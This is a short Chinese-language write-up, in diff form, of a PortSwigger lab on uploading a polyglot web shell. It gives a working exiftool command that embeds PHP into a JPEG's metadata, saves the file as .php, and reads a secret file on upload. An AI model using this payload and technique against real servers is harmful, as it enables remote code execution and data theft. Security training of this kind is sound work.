@@ -1,0 +1,21 @@
+靶场地址: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
+
+=====新知识1:元数据=====
+本题通过 exiftool编辑文件的元数据
+在一个给一个图片附加 php语句
+上传时,因为它是图片类型不会被拦截,但其 php语句却可以直接执行
+
+###
+进入靶场
+随便上传了一个图片  -> 图1
+
+###
+使用 exiftool工具,编辑图片的元数据,加入 php语句
+exiftool.exe "-Comment=<?php echo 'Start:'.file_get_contents('/home/carlos/secret').'End'?>" .\yao.jpg -o yao2.php
+=>
+我自己编写的时候，因为引号的混用栽了不少坑  -> 图2
+
+###
+本题校验的是文件内容, yao2.php到底还是一张图片,但是 php扩展名让服务器把它交给了php处理器
+上传 yao2.php   -> 图3
+solved
